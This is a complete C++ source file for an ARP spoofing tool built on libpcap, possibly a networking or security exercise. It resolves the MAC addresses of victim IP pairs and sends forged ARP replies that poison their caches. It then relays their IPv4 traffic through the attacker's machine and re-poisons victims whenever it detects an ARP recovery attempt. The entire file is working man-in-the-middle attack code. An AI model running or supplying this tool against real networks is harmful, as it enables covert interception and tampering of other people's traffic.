#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <net/if.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include "iphdr.h"
#include <stdlib.h>
#include <malloc.h>

#define MAC_ALEN 6

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}


bool get_Ip(char* dev, char* ip_buf) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return false;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
        close(sock);
        return false;
    }
    inet_ntop(AF_INET, ifr.ifr_addr.sa_data + 2, ip_buf, sizeof(struct sockaddr));
    close(sock);
    return true;
}

bool get_Mac(char* dev, uint8_t* mac_buf) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return false;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        close(sock);
        return false;
    }
    memcpy(mac_buf, ifr.ifr_hwaddr.sa_data, 6);
    close(sock);
    return true;
}

void sendArpRequest(pcap_t* pcap, uint32_t target_ip, uint8_t* src_mac, char* src_ip_str) {
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = Mac(src_mac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(src_mac);
    packet.arp_.sip_ = htonl(Ip(src_ip_str));
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(target_ip);

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
    }
}

void getMacFromArp(pcap_t* pcap, uint32_t src_ip, Mac* resolved_mac) {
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* data;
        int res = pcap_next_ex(pcap, &header, &data);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) break;

        EthHdr* eth = (EthHdr*)data;
        ArpHdr* arp = (ArpHdr*)(data + sizeof(EthHdr));

        if (eth->type() != EthHdr::Arp) continue;
        if (arp->sip() != Ip(src_ip)) continue;

        *resolved_mac = arp->smac();
        break;
    }
}

void sendArpReply(pcap_t* pcap, Mac dst_mac, Mac src_mac, uint32_t spoofed_ip, uint32_t victim_ip) {
    EthArpPacket packet;
    packet.eth_.dmac_ = dst_mac;
    packet.eth_.smac_ = src_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = src_mac;
    packet.arp_.sip_ = htonl(spoofed_ip);
    packet.arp_.tmac_ = dst_mac;
    packet.arp_.tip_ = htonl(victim_ip);

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
    }
}


void resolve_pair_info(
    pcap_t* pcap,
    int pair_num,
    char** argv,
    uint8_t* local_mac,
    char* local_ip,
    Mac (*mac_table)[2],
    uint32_t (*ip_table)[2]
    ) {
    for (int i = 0; i < pair_num; i++) {
        uint32_t src_ip = Ip(argv[2 + i * 2]);
        uint32_t dst_ip = Ip(argv[3 + i * 2]);
        ip_table[i][0] = src_ip;
        ip_table[i][1] = dst_ip;

        Mac src_mac, dst_mac;
        sendArpRequest(pcap, src_ip, local_mac, local_ip);
        getMacFromArp(pcap, src_ip, &src_mac);
        sendArpRequest(pcap, dst_ip, local_mac, local_ip);
        getMacFromArp(pcap, dst_ip, &dst_mac);

        mac_table[i][0] = src_mac;
        mac_table[i][1] = dst_mac;
    }
    sleep(1);
}

void keep_spoofing_and_relay(
    pcap_t* pcap,
    Mac (*mac_table)[2],
    uint32_t (*ip_table)[2],
    Mac my_mac,
    uint32_t my_ip,
    int pair_num
    );

int relay_and_detect(
    pcap_t* pcap,
    Mac mac_table[][2],
    uint32_t ip_table[][2],
    Mac my_mac,
    uint32_t my_ip,
    int pair_num
    ) {
    while (true) {
        struct pcap_pkthdr* pkt_hdr;
        const u_char* pkt_data;
        int res = pcap_next_ex(pcap, &pkt_hdr, &pkt_data);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            fprintf(stderr, "pcap_next_ex error: %s\n", pcap_geterr(pcap));
            break;
        }

        EthHdr* eth = (EthHdr*)pkt_data;


        if (eth->type() == EthHdr::Ip4) {
            IPHeader* ip = (IPHeader*)(pkt_data + sizeof(EthHdr));
            uint32_t src_ip = ntohl((uint32_t)ip->sourceAddress);
            uint32_t dst_ip = ntohl((uint32_t)ip->destinationAddress);

            for (int i = 0; i < pair_num; i++) {

                if (eth->smac() == mac_table[i][0] && src_ip == ip_table[i][0] && dst_ip == ip_table[i][1]) {
                    eth->smac_ = my_mac;
                    eth->dmac_ = mac_table[i][1];
                    int send_res = pcap_sendpacket(pcap, pkt_data, ntohs(ip->totalLength) + sizeof(EthHdr));
                    if (send_res != 0) {
                        fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(pcap));
                    }
                    break;
                }

                if (eth->smac() == mac_table[i][1] && src_ip == ip_table[i][1] && dst_ip == ip_table[i][0]) {
                    eth->smac_ = my_mac;
                    eth->dmac_ = mac_table[i][0];
                    int send_res = pcap_sendpacket(pcap, pkt_data, ntohs(ip->totalLength) + sizeof(EthHdr));
                    if (send_res != 0) {
                        fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(pcap));
                    }
                    break;
                }
            }
        }

        else if (eth->type() == EthHdr::Arp) {
            for (int i = 0; i < pair_num; i++) {
                if (eth->smac() == mac_table[i][0]) {
                    if (eth->dmac() == Mac("ff:ff:ff:ff:ff:ff")) {
                        printf("[-] Victim %d broadcast ARP recovery attempt detected.\n", i + 1);
                        return i;
                    } else {
                        printf("[-] Victim %d unicast ARP recovery attempt detected.\n", i + 1);
                        return i;
                    }
                }
            }
        }
    }
    return 0;
}

void keep_spoofing_and_relay(
    pcap_t* pcap,
    Mac (*mac_table)[2],
    uint32_t (*ip_table)[2],
    Mac my_mac,
    uint32_t my_ip,
    int pair_num
    ) {
    while (true) {
        int idx = relay_and_detect(pcap, mac_table, ip_table, my_mac, my_ip, pair_num);
        if (idx % 2 == 1) {
            for (int i = 0; i < pair_num; i++) {
                sendArpReply(pcap, mac_table[i][0], my_mac, ip_table[i][1], ip_table[i][0]);
            }
        } else {
            sendArpReply(pcap, mac_table[idx][0], my_mac, ip_table[idx][1], ip_table[idx][0]);
            sendArpReply(pcap, mac_table[idx][1], my_mac, ip_table[idx][0], ip_table[idx][1]);
        }
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || ((argc - 2) % 2 != 0)) {
        usage();
        return -1;
    }
    char* interface = argv[1];
    int pair_num = (argc - 2) / 2;
    Mac mac_table[pair_num][2];
    uint32_t ip_table[pair_num][2];

    char local_ip[20];
    if (!get_Ip(interface, local_ip)) {
        fprintf(stderr, "Failed to get local IP\n");
        return -1;
    }
    uint32_t local_ip_raw = (uint32_t)Ip(local_ip);
    printf("Local IP: %s (%u)\n", local_ip, local_ip_raw);

    uint8_t local_mac[6];
    if (!get_Mac(interface, local_mac)) {
        fprintf(stderr, "Failed to get local MAC\n");
        return -1;
    }

    char pcap_err[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(interface, BUFSIZ, 1, 1, pcap_err);
    if (pcap == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", interface, pcap_err);
        return -1;
    }

    resolve_pair_info(pcap, pair_num, argv, local_mac, local_ip, mac_table, ip_table);


    for (int i = 0; i < pair_num; i++) {
        sendArpReply(pcap, mac_table[i][0], Mac(local_mac), ip_table[i][1], ip_table[i][0]);
        printf("ARP spoofed\n");
    }

    keep_spoofing_and_relay(pcap, mac_table, ip_table, Mac(local_mac), local_ip_raw, pair_num);

    pcap_close(pcap);
    return 0;
}
